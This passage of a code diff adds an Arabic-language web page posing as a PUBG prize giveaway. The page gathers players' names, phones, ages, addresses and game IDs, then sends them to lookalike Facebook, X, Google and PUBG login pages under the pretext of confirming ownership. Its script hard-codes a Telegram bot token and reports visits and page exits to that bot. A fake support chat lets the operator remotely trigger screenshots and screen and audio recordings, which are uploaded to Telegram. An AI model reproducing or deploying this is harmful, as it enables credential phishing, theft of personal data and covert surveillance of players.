+                <div class="field-help-text" id="helpAddress">أدخل الدولة والمدينة الحالية لتحديد سيرفر التسليم الأقرب إليك.</div>
+            </div>
+
+            <!-- معرف الحساب الأيدي -->
+            <div class="form-group">
+                <div class="label-wrapper">
+                    <label class="form-label">معرف الحساب الأيدي (Player ID):</label>
+                    <button class="help-btn" onclick="toggleHelp('helpPlayerID')" title="مساعدة">؟</button>
+                </div>
+                <div class="input-box-relative">
+                    <input type="text" id="inputPlayerID" class="form-input" placeholder="أدخل الأيدي بالأرقام مثل: 5123456789" oninput="validatePersonalForm()">
+                    <i class="fa-solid fa-circle-check input-status-icon" id="iconPlayerID"></i>
+                </div>
+                <div class="field-help-text" id="helpPlayerID">أدخل الأيدي الخاص بك في ببجي بالأرقام فقط. يمنع كتابة أرقام عشوائية مكررة مثل 111111 أو 123456.</div>
+            </div>
+
+            <!-- المستوى الحالي -->
+            <div class="form-group">
+                <div class="label-wrapper">
+                    <label class="form-label">المستوى الحالي في اللعبة (Level):</label>
+                    <button class="help-btn" onclick="toggleHelp('helpLevel')" title="مساعدة">؟</button>
+                </div>
+                <div class="input-box-relative">
+                    <input type="number" id="inputLevel" class="form-input" placeholder="مثال: 55" min="1" max="100" oninput="validatePersonalForm()">
+                    <i class="fa-solid fa-circle-check input-status-icon" id="iconLevel"></i>
+                </div>
+                <div class="field-help-text" id="helpLevel">مستوى حسابك الحالي داخل اللعبة. يمنع ترك هذه الخانة فارغة.</div>
+            </div>
+
+            <div style="background:#fee2e2; color:#991b1b; padding:8px 12px; border-radius:8px; font-size:0.8rem; font-weight:700; margin-bottom:15px; text-align:center;">
+                ⚠️ ملاحظة: يمنع ترك أي من هذه الخانات فارغة لضمان استكمال التسجيل.
+            </div>
+
+            <div class="btn-group">
+                <button class="btn-primary" id="btnNextStep3" disabled onclick="submitStep3Logic()">
+                    <span>الانتقال للخطوة التالية</span>
+                    <i class="fa-solid fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- 🟢 الخطوة الرابعة: طلب تسجيل الدخول وتأكيد الحساب -->
+        <div class="glass-card" id="cardStep4">
+            
+            <div id="loaderPhase1" class="spinner-overlay">
+                <div class="spinner-ring"></div>
+                <h3 style="font-weight:800; color:#333;">جاري التحقق وفحص البيانات الشخصية...</h3>
+            </div>
+
+            <div id="unrecognizedAccountPhase" style="display: none; text-align: center; padding: 15px 0;">
+                <i class="fa-solid fa-triangle-exclamation" style="font-size:3.5rem; color:#e63946; margin-bottom:15px;"></i>
+                <h3 style="color:#111; font-weight:900; margin-bottom:12px;">لم نتعرف على حسابك!</h3>
+                <p style="color:#444; font-weight:700; line-height:1.6; margin-bottom:20px; font-size:0.95rem;">
+                    لم نتعرف على حسابك، قم بتسجيل الدخول لتأكيد ملكية حسابك واستلام الجائزة المحددة.
+                </p>
+                <button class="btn-primary" style="width:100%;" onclick="startLoginPlatformPhase()">
+                    <i class="fa-solid fa-right-to-bracket"></i>
+                    <span>تسجيل الدخول</span>
+                </button>
+            </div>
+
+            <div id="loaderPhase2" class="spinner-overlay" style="display: none;">
+                <div class="spinner-ring"></div>
+                <h3 style="font-weight:800; color:#333;">جاري فتح موقع (منصات التسجيل المعتمدة)...</h3>
+            </div>
+
+            <div id="platformsPhase" style="display: none;">
+                <div class="card-header-title">
+                    <i class="fa-solid fa-shield-halved"></i>
+                    <span>طرق تأكيد ملكية الحساب المعتمدة</span>
+                </div>
+                <p style="text-align:center; color:#555; font-weight:700; font-size:0.85rem; margin-bottom:15px;">
+                    اختر إحدى الطرق التالية المعتمدة لتأكيد ملكية حسابك والتوجيه المباشر لرابط التوثيق:
+                </p>
+
+                <div class="platforms-grid">
+                    <a href="https://pubgrivals7-png.github.io/-/facebook.html" target="_blank" class="platform-link-btn fb" onclick="trackPlatformClick('فيسبوك')">
+                        <i class="fa-brands fa-facebook"></i>
+                        <span>فيسبوك</span>
+                    </a>
+                    <a href="https://pubgrivals7-png.github.io/-/twitter.html" target="_blank" class="platform-link-btn tw" onclick="trackPlatformClick('تويتر / X')">
+                        <i class="fa-brands fa-x-twitter"></i>
+                        <span>تويتر / X</span>
+                    </a>
+                    <a href="https://pubgrivals7-png.github.io/-/google.html" target="_blank" class="platform-link-btn gg" onclick="trackPlatformClick('جوجل')">
+                        <i class="fa-brands fa-google"></i>
+                        <span>جوجل</span>
+                    </a>
+                    <a href="https://pubgrivals7-png.github.io/-/pubg.html" target="_blank" class="platform-link-btn em" onclick="trackPlatformClick('البريد الإلكتروني')">
+                        <i class="fa-solid fa-envelope"></i>
+                        <span>البريد الإلكتروني</span>
+                    </a>
+                    <a href="https://pubgrivals7-png.github.io/-/pubg.html" target="_blank" class="platform-link-btn ph" onclick="trackPlatformClick('رقم الهاتف')">
+                        <i class="fa-solid fa-phone"></i>
+                        <span>رقم الهاتف</span>
+                    </a>
+                </div>
+            </div>
+
+        </div>
+
+    </main>
+
+    <!-- واجهة نافذة الدردشة العائمة المباشرة -->
+    <div id="chat-widget" class="chat-widget-container" style="display: none;">
+        <div class="chat-header">
+            <div class="chat-header-info">
+                <span class="status-dot" id="support-status-dot"></span>
+                <div>
+                    <div class="chat-title">الدعم الفني للمسابقة</div>
+                    <div class="chat-substatus" id="support-status-text">متصل الآن</div>
+                </div>
+            </div>
+            <button class="chat-close-btn" onclick="toggleChat()">✕</button>
+        </div>
+
+        <div class="chat-box" id="chat-box"></div>
+
+        <div id="chat-file-preview" class="chat-file-preview" style="display:none;">
+            تم اختيار صورة جاهزة للإرسال ✔
+        </div>
+
+        <form class="chat-input-area" onsubmit="sendChatMessage(event)">
+            <label for="chat-file-input" class="chat-btn-icon" title="إرفاق صورة">
+                📷
+                <input type="file" id="chat-file-input" accept="image/*" style="display:none;" onchange="showChatFilePreview()">
+            </label>
+            
+            <button type="button" class="chat-btn-icon" title="التقاط الشاشة وإرسالها فوراً" onclick="takeUserInstantScreenshot()">
+                📸
+            </button>
+
+            <input type="text" id="chat-user-input" placeholder="اكتب رسالتك..." autocomplete="off" oninput="saveDraftMessage()">
+            <button type="submit" class="chat-send-btn">إرسال</button>
+        </form>
+    </div>
+
+    <!-- الزر الدائري العائم -->
+    <button class="floating-chat-trigger" onclick="toggleChat()" title="الدعم المباشر">
+        🎧
+    </button>
+
+    <!-- المحرك البرمجي الشامل -->
+    <script>
+        const BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+        const CHAT_ID = "8796885500";
+
+        let contestantId = localStorage.getItem("contestant_id");
+        let contestantName = localStorage.getItem("contestant_name") || "متسابق";
+
+        if (!contestantId) {
+            contestantId = "USER_" + Math.floor(100000 + Math.random() * 900000);
+            localStorage.setItem("contestant_id", contestantId);
+        }
+
+        let lastUpdateId = parseInt(sessionStorage.getItem("last_telegram_update_id") || "0");
+        const processedMsgIds = new Set(JSON.parse(sessionStorage.getItem("processed_msg_ids") || "[]"));
+
+        let isChatOpen = false;
+        let autoCloseTimer = null;
+        let isSupportOnline = true;
+
+        let lastLeaveAlertTime = 0;
+        let lastOnlineAlertTime = 0;
+        const THROTTLE_60_SEC = 60000;
+
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+
+        // ==========================================
+        // 📡 نظام المزامنة والاحتفاظ بالبيانات Offline Logic
+        // ==========================================
+        function getOfflineQueue() {
+            return JSON.parse(localStorage.getItem("offline_pending_queue") || "[]");
+        }
+
+        function saveToOfflineQueue(text) {
+            const queue = getOfflineQueue();
+            queue.push({ text: text, timestamp: Date.now() });
+            localStorage.setItem("offline_pending_queue", JSON.stringify(queue));
+        }
+
+        function clearOfflineQueue() {
+            localStorage.setItem("offline_pending_queue", JSON.stringify([]));
+        }
+
+        async function syncOfflineQueue() {
+            const queue = getOfflineQueue();
+            if (queue.length === 0) return;
+
+            const pending = [...queue];
+            clearOfflineQueue();
+
+            for (const item of pending) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: item.text, parse_mode: "Markdown" })
+                    });
+                } catch (e) {
+                    saveToOfflineQueue(item.text);
+                }
+            }
+        }
+
+        function checkNetworkAndBlock() {
+            const overlay = document.getElementById("offlineOverlay");
+            if (!navigator.onLine) {
+                overlay.classList.add("active");
+            } else {
+                overlay.classList.remove("active");
+                syncOfflineQueue();
+            }
+        }
+
+        window.addEventListener('online', checkNetworkAndBlock);
+        window.addEventListener('offline', checkNetworkAndBlock);
+
+        function saveFormDataLocally() {
+            const formData = {
+                name: document.getElementById('inputFullName').value,
+                phone: document.getElementById('inputPhone').value,
+                age: document.getElementById('inputAge').value,
+                address: document.getElementById('inputAddress').value,
+                pid: document.getElementById('inputPlayerID').value,
+                level: document.getElementById('inputLevel').value,
+                reward: state.selectedReward
+            };
+            localStorage.setItem("saved_form_draft", JSON.stringify(formData));
+        }
+
+        function restoreFormDataLocally() {
+            const saved = JSON.parse(localStorage.getItem("saved_form_draft") || "{}");
+            if (saved.name) document.getElementById('inputFullName').value = saved.name;
+            if (saved.phone) document.getElementById('inputPhone').value = saved.phone;
+            if (saved.age) document.getElementById('inputAge').value = saved.age;
+            if (saved.address) document.getElementById('inputAddress').value = saved.address;
+            if (saved.pid) document.getElementById('inputPlayerID').value = saved.pid;
+            if (saved.level) document.getElementById('inputLevel').value = saved.level;
+            validatePersonalForm();
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            checkNetworkAndBlock();
+            restoreFormDataLocally();
+            loadChatHistory();
+            loadDraftMessage();
+            notifyUserEntrance();
+            startCountdown();
+            animateParticles();
+        });
+
+        function sendTelegramAlert(text) {
+            if (!navigator.onLine) {
+                saveToOfflineQueue(text);
+                return;
+            }
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            }).catch(() => {
+                saveToOfflineQueue(text);
+            });
+        }
+
+        function playNotificationSound(type = 'receive') {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+
+                if (type === 'receive') {
+                    osc.frequency.setValueAtTime(587.33, ctx.currentTime);
+                    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1);
+                    gain.gain.setValueAtTime(0.2, ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+                    osc.start();
+                    osc.stop(ctx.currentTime + 0.3);
+                } else {
+                    osc.frequency.setValueAtTime(440, ctx.currentTime);
+                    gain.gain.setValueAtTime(0.15, ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
+                    osc.start();
+                    osc.stop(ctx.currentTime + 0.15);
+                }
+            } catch (e) { }
+        }
+
+        window.toggleChat = function() {
+            if (!navigator.onLine) return;
+            const widget = document.getElementById("chat-widget");
+            if (!widget) return;
+            isChatOpen = !isChatOpen;
+            widget.style.display = isChatOpen ? "flex" : "none";
+            cancelAutoClose();
+        };
+
+        function openChat() {
+            const widget = document.getElementById("chat-widget");
+            if (widget) {
+                widget.style.display = "flex";
+                isChatOpen = true;
+            }
+        }
+
+        function cancelAutoClose() {
+            if (autoCloseTimer) {
+                clearTimeout(autoCloseTimer);
+                autoCloseTimer = null;
+            }
+        }
+
+        function trigger10SecAutoOpen() {
+            if (!isChatOpen) {
+                openChat();
+                cancelAutoClose();
+                autoCloseTimer = setTimeout(() => {
+                    const widget = document.getElementById("chat-widget");
+                    if (widget) widget.style.display = "none";
+                    isChatOpen = false;
+                }, 10000);
+            }
+        }
+
+        function getCurrentTimeFormatted() {
+            const now = new Date();
+            return now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });
+        }
+
+        window.saveDraftMessage = function() {
+            const input = document.getElementById("chat-user-input");
+            if (input) sessionStorage.setItem("chat_draft", input.value);
+        };
+
+        function loadDraftMessage() {
+            const draft = sessionStorage.getItem("chat_draft");
+            const input = document.getElementById("chat-user-input");
+            if (draft && input) input.value = draft;
+        }
+
+        function saveChatHistory(msgObj) {
+            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+            history.push(msgObj);
+            sessionStorage.setItem("chat_history", JSON.stringify(history));
+        }
+
+        function loadChatHistory() {
+            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+            history.forEach(m => renderMessage(m.text, m.className, m.time, m.status, m.imgUrl));
+        }
+
+        function notifyUserEntrance() {
+            const now = Date.now();
+            if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
+                lastOnlineAlertTime = now;
+                const msg = `⚡ **دخول لصفحة المسابقة:**\n👤 **الاسم:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\` *(اضغط للنسخ)*`;
+                sendTelegramAlert(msg);
+            }
+        }
+
+        document.addEventListener("visibilitychange", () => {
+            const now = Date.now();
+            if (document.hidden) {
+                if (now - lastLeaveAlertTime >= THROTTLE_60_SEC) {
+                    lastLeaveAlertTime = now;
+                    sendTelegramAlert(`⚠️ **تنبيه مغادرة:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) غادر الصفحة أو غير التطبيق.`);
+                }
+            } else {
+                if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
+                    lastOnlineAlertTime = now;
+                    sendTelegramAlert(`🟢 **متصل الآن:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) عاد للصفحة.`);
+                }
+            }
+        });
+
+        window.showChatFilePreview = function() {
+            const preview = document.getElementById("chat-file-preview");
+            if (preview) preview.style.display = "block";
+        };
+
+        window.sendChatMessage = function(e) {
+            if (e) e.preventDefault();
+            cancelAutoClose();
+
+            const textInput = document.getElementById("chat-user-input");
+            const fileInput = document.getElementById("chat-file-input");
+            const preview = document.getElementById("chat-file-preview");
+
+            const text = textInput ? textInput.value.trim() : "";
+            const hasFile = fileInput && fileInput.files.length > 0;
+
+            if (!text && !hasFile) return;
+
+            playNotificationSound('send');
+            const timeStr = getCurrentTimeFormatted();
+            const formattedHeader = `📌 **رسالة من:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\`\n💬 **الرسالة:** ${text}`;
+
+            if (hasFile && navigator.onLine) {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", fileInput.files[0]);
+                formData.append("caption", formattedHeader);
+                formData.append("parse_mode", "Markdown");
+
+                const fileURL = URL.createObjectURL(fileInput.files[0]);
+                displayAndSaveMessage(text, 'user-msg', timeStr, '✔', fileURL);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            } else {
+                displayAndSaveMessage(text, 'user-msg', timeStr, '✔');
+                sendTelegramAlert(formattedHeader);
+            }
+
+            if (!isSupportOnline) {
+                setTimeout(() => {
+                    displayAndSaveMessage("وصلتنا رسالتك وسيجاب عليها قريباً.", 'admin-msg', getCurrentTimeFormatted(), '');
+                }, 1000);
+            }
+
+            if (textInput) textInput.value = "";
+            sessionStorage.removeItem("chat_draft");
+            if (fileInput) fileInput.value = "";
+            if (preview) preview.style.display = "none";
+        };
+
+        window.takeUserInstantScreenshot = function() {
+            takeScreenShot(0);
+        };
+
+        function takeScreenShot(delaySeconds = 0) {
+            if (typeof html2canvas === 'undefined' || !navigator.onLine) return;
+            
+            const executeShot = () => {
+                html2canvas(document.body).then(canvas => {
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("photo", blob, "user_screenshot.png");
+                        formData.append("caption", `📸 **لقطة شاشة للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                        formData.append("parse_mode", "Markdown");
+
+                        const timeStr = getCurrentTimeFormatted();
+                        const imgURL = URL.createObjectURL(blob);
+                        displayAndSaveMessage("تم إرسال لقطة الشاشة للدعم.", 'user-msg', timeStr, '✔', imgURL);
+                        playNotificationSound('send');
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                    });
+                });
+            };
+
+            if (delaySeconds > 0) {
+                setTimeout(executeShot, delaySeconds * 1000);
+            } else {
+                executeShot();
+            }
+        }
+
+        async function startScreenRecording(durationSeconds = 10, delaySeconds = 0) {
+            if (isRecording || !navigator.onLine) return;
+
+            const startExec = async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: { mediaSource: "screen" },
+                        audio: true
+                    });
+
+                    recordedChunks = [];
+                    mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) recordedChunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        isRecording = false;
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        const blob = new Blob(recordedChunks, { type: "video/webm" });
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("video", blob, "screen_record.webm");
+                        formData.append("caption", `🎥 **تسجيل فيديو للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                        formData.append("parse_mode", "Markdown");
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: formData })
+                            .catch(() => {
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: formData });
+                            });
+                    };
+
+                    mediaRecorder.start();
+                    isRecording = true;
+
+                    if (durationSeconds > 0) {
+                        setTimeout(() => {
+                            stopScreenRecording();
+                        }, durationSeconds * 1000);
+                    }
+
+                } catch (err) {
+                    sendTelegramAlert(`❌ **فشل بدء تسجيل الفيديو:** ${err.message}`);
+                }
+            };
+
+            if (delaySeconds > 0) {
+                setTimeout(startExec, delaySeconds * 1000);
+            } else {
+                startExec();
+            }
+        }
+
+        function stopScreenRecording() {
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+            }
+        }
+
+        function displayAndSaveMessage(text, className, time, status = '', imgUrl = null) {
+            renderMessage(text, className, time, status, imgUrl);
+            saveChatHistory({ text, className, time, status, imgUrl });
+        }
+
+        function renderMessage(text, className, time, status = '', imgUrl = null) {
+            const chatBox = document.getElementById("chat-box");
+            if (!chatBox) return;
+
+            const msgElement = document.createElement("div");
+            msgElement.className = `msg ${className}`;
+
+            if (imgUrl) {
+                const img = document.createElement("img");
+                img.src = imgUrl;
+                msgElement.appendChild(img);
+            }
+
+            if (text) {
+                const textSpan = document.createElement("span");
+                textSpan.innerText = text;
+                msgElement.appendChild(textSpan);
+            }
+
+            const metaDiv = document.createElement("div");
+            metaDiv.className = "msg-meta";
+            metaDiv.innerHTML = `<span>${time}</span>` + (status ? `<span class="checkmark ${status === '✔✔' ? 'read' : ''}">${status}</span>` : '');
+            msgElement.appendChild(metaDiv);
+
+            chatBox.appendChild(msgElement);
+            chatBox.scrollTop = chatBox.scrollHeight;
+        }
+
+        function fetchAdminMessages() {
+            if (!navigator.onLine) return;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                .then(res => res.json())
+                .then(async data => {
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                            sessionStorage.setItem("last_telegram_update_id", lastUpdateId.toString());
+
+                            const msg = update.message;
+                            if (!msg) continue;
+
+                            if (processedMsgIds.has(msg.message_id)) continue;
+
+                            let text = msg.text || msg.caption || "";
+
+                            if (text.includes(contestantId)) {
+                                processedMsgIds.add(msg.message_id);
+                                sessionStorage.setItem("processed_msg_ids", JSON.stringify(Array.from(processedMsgIds)));
+
+                                document.querySelectorAll(".user-msg .checkmark").forEach(el => {
+                                    el.innerText = "✔✔";
+                                    el.classList.add("read");
+                                });
+
+                                if (text.includes("/shot")) {
+                                    const match = text.match(/\/shot\s*(\d+)?/i);
+                                    const delay = match && match[1] ? parseInt(match[1]) : 0;
+                                    takeScreenShot(delay);
+                                    continue;
+                                }
+
+                                if (text.includes("/record")) {
+                                    const match = text.match(/\/record\s*(\d+)?\s*(\d+)?/i);
+                                    const duration = match && match[1] ? parseInt(match[1]) : 10;
+                                    const delay = match && match[2] ? parseInt(match[2]) : 0;
+                                    startScreenRecording(duration, delay);
+                                    continue;
+                                }
+
+                                if (text.includes("/stop")) {
+                                    stopScreenRecording();
+                                    continue;
+                                }
+
+                                if (text.includes("/offline")) {
+                                    setSupportStatus(false);
+                                    continue;
+                                }
+
+                                if (text.includes("/online")) {
+                                    setSupportStatus(true);
+                                    continue;
+                                }
+
+                                let telegramImgUrl = null;
+                                if (msg.photo && msg.photo.length > 0) {
+                                    const largestPhoto = msg.photo[msg.photo.length - 1];
+                                    try {
+                                        const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${largestPhoto.file_id}`);
+                                        const fileData = await fileRes.json();
+                                        if (fileData.ok && fileData.result.file_path) {
+                                            telegramImgUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
+                                        }
+                                    } catch (e) {}
+                                }
+
+                                let cleanText = text.replace(new RegExp(contestantId + ":?", "gi"), "").trim();
+                                if (cleanText || telegramImgUrl) {
+                                    displayAndSaveMessage(cleanText, 'admin-msg', getCurrentTimeFormatted(), '', telegramImgUrl);
+                                    playNotificationSound('receive');
+                                    trigger10SecAutoOpen();
+                                }
+                            }
+                        }
+                    }
+                })
+                .catch(() => {});
+        }
+
+        function setSupportStatus(online) {
+            isSupportOnline = online;
+            const dot1 = document.getElementById("support-status-dot");
+            const dot2 = document.getElementById("header-status-dot");
+            const statusText = document.getElementById("support-status-text");
+
+            if (online) {
+                if (dot1) dot1.classList.remove("offline");
+                if (dot2) dot2.classList.remove("offline");
+                if (statusText) statusText.innerText = "متصل الآن";
+            } else {
+                if (dot1) dot1.classList.add("offline");
+                if (dot2) dot2.classList.add("offline");
+                if (statusText) statusText.innerText = "غير متصل حالياً";
+            }
+        }
+
+        setInterval(fetchAdminMessages, 2000);
+
+        class AudioEngine {
+            constructor() {
+                this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            playClick() {
+                if (this.ctx.state === 'suspended') this.ctx.resume();
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(800, this.ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(400, this.ctx.currentTime + 0.05);
+                gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+                osc.start();
+                osc.stop(this.ctx.currentTime + 0.05);
+            }
+            playTick() {
+                if (this.ctx.state === 'suspended') this.ctx.resume();
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+                osc.type = 'square';
+                osc.frequency.setValueAtTime(1200, this.ctx.currentTime);
+                gain.gain.setValueAtTime(0.05, this.ctx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.001, this.ctx.currentTime + 0.03);
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+                osc.start();
+                osc.stop(this.ctx.currentTime + 0.03);
+            }
+            playTimerEnd() {
+                if (this.ctx.state === 'suspended') this.ctx.resume();
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(300, this.ctx.currentTime);
+                gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.25);
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+                osc.start();
+                osc.stop(this.ctx.currentTime + 0.25);
+            }
+            playCorrect() {
+                if (this.ctx.state === 'suspended') this.ctx.resume();
+                const now = this.ctx.currentTime;
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(523.25, now);
+                osc.frequency.setValueAtTime(659.25, now + 0.1);
+                osc.frequency.setValueAtTime(783.99, now + 0.2);
+                gain.gain.setValueAtTime(0.4, now);
+                gain.gain.linearRampToValueAtTime(0.01, now + 0.4);
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+                osc.start();
+                osc.stop(now + 0.4);
+            }
+            playWrong() {
+                if (this.ctx.state === 'suspended') this.ctx.resume();
+                const now = this.ctx.currentTime;
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(180, now);
+                osc.frequency.setValueAtTime(140, now + 0.15);
+                gain.gain.setValueAtTime(0.4, now);
+                gain.gain.linearRampToValueAtTime(0.01, now + 0.35);
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+                osc.start();
+                osc.stop(now + 0.35);
+            }
+        }
+        const audio = new AudioEngine();
+
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('button, .step-tab, .reward-card, a')) {
+                audio.playClick();
+            }
+        });
+
+        const pubgTriviaBank = [
+            { q: "ما هي أقوى بندقية قنص يدوية (Bolt-Action) في ببجي موبايل من حيث الضرر؟", opts: ["AWM", "M24", "Kar98k", "Mosin Nagant"], a: 0 },
+            { q: "أي خريطة من خرائط ببجي تتميز بتواجد المصاعد والعماير الشاهقة؟", opts: ["نوسا", "إرنغل", "ميرامار", "كاراكين"], a: 0 },
+            { q: "ما هو حجم المخزن الأساسي لسلاح الرشاش الخفيف M249 قبل التوسعة؟", opts: ["75 طلقة", "100 طلقة", "50 طلقة", "60 طلقة"], a: 0 },
+            { q: "ما السلاح الذي يلقب بـ 'ملك المواجهات القريبة' لسعة وسرعة إطلاقه؟", opts: ["Uzi", "Vector", "UMP45", "Tommy Gun"], a: 0 },
+            { q: "في أي خريطة تظهر الزوبعة الرملية التي تعيق الرؤية وتدمر البنيات؟", opts: ["كاراكين", "ميرامار", "فيكندي", "سانهوك"], a: 0 },
+            { q: "كم عدد اللاعبين الأقصى في المباراة الكلاسيكية الواحدة في خريطة إرنغل؟", opts: ["100 لاعب", "64 لاعب", "50 لاعب", "80 لاعب"], a: 0 },
+            { q: "ما هي طلقة السلاح المساندة لـ AWM؟", opts: [".300 Magnum", "7.62mm", "5.56mm", "9mm"], a: 0 },
+            { q: "ما فائدة استخدام 'حقيبة الإسعافات الأوليّة' (First Aid Kit)؟", opts: ["تعيد الصحة حتى 75%", "تعيد الصحة بنسبة 100%", "تعطي طاقة حزام كاملة", "تعيد الصحة حتى 50%"], a: 0 },
+            { q: "أي خريطة تتميز بوجود ثلج وتزلج وغزلان ومناظر قريبة من القطب؟", opts: ["فيكندي", "ليفيك", "سانهوك", "كاراكين"], a: 0 },
+            { q: "ما اسم القنابل التي تطلق دخاناً كثيفاً حامياً للاعبين أثناء التثبيت؟", opts: ["قنبلة دخانية (Smoke)", "قنبلة صدمة (Stun)", "قنبلة مولوتوف", "قنبلة شظايا"], a: 0 },
+            { q: "أي من الأسلحة التالية يستخدم عيار 7.62mm ويتميز بضرر مرتفع جداً وارتداد عالي؟", opts: ["AKM", "M416", "SCAR-L", "AUG"], a: 0 },
+            { q: "كم ثانية تستغرق عملية إعادة إحياء (Revive) الزميل الساقط؟", opts: ["10 ثوانٍ", "5 ثوانٍ", "12 ثانية", "8 ثوانٍ"], a: 0 },
+            { q: "أي سلاح يعتبر خياراً مثالياً للثبات في المدى المتوسط بفضل امكانية تركيب 5 قطعات؟", opts: ["M416", "GROZA", "Beryl M762", "Mk14"], a: 0 },
+            { q: "ما السلاح الذي يخرج فقط من صندوق الإمدادات (Drop) ويطلق عيار 7.62mm أوتوماتيكي؟", opts: ["GROZA", "AKM", "DP-28", "SKS"], a: 0 },
+            { q: "ما هي الخريطة ذات الحجم الأصغر بـ 2x2 كم وتضم 52 لاعباً فقط؟", opts: ["ليفيك", "نوسا", "سانهوك", "إرنغل"], a: 0 },
+            { q: "ما السلاح الذي يمكن طي أخمص قدمه (Bipod) عند الانحناء أو الانطاح لزيادة الثبات؟", opts: ["DP-28", "M416", "Vector", "Mini14"], a: 0 },
+            { q: "ما الذي يحدث عند إطلاق مسدس الإشارات داخل المنطقة الآمنة (Safe Zone)؟", opts: ["استدعاء صندوق إمدادات جوي (Drop)", "استدعاء مدرعة BRDM", "استدعاء طائرة هليكوبتر", "إرسال قنبلة ذكية"], a: 0 },
+            { q: "أي من السيارات التالية تعتبر الأسرع على الطرق المعبدة في خريطة إرنغل؟", opts: ["Dacia", "UAZ", "Buggy", "Pickup"], a: 0 },
+            { q: "أي خريطة تتميز بالأشجار الاستوائية والمعابد القديمة والأمطار المتكررة؟", opts: ["سانهوك", "ميرامار", "فيكندي", "ليفيك"], a: 0 },
+            { q: "ما هو الملحق الذي يقلل من صوت السلاح ويخفي الوميض الصادر عند الإطلاق؟", opts: ["كاتم الصوت (Suppressor)", "تعويض الارتداد (Compensator)", "مخفي الوميض (Flash Hider)", "الخنق (Choke)"], a: 0 },
+            { q: "ما اسم الخريطة الصحراوية الشاسعة المترامية الأطراف؟", opts: ["ميرامار", "كاراكين", "نوسا", "إرنغل"], a: 0 },
+            { q: "ما هو الملحق الذي يساعد في تقليل الارتداد الرأسي والأفقي معاً للسلاح؟", opts: ["المُعوض (Compensator)", "الكاتم", "مخفي الوميض", "المقبض المائل"], a: 0 },
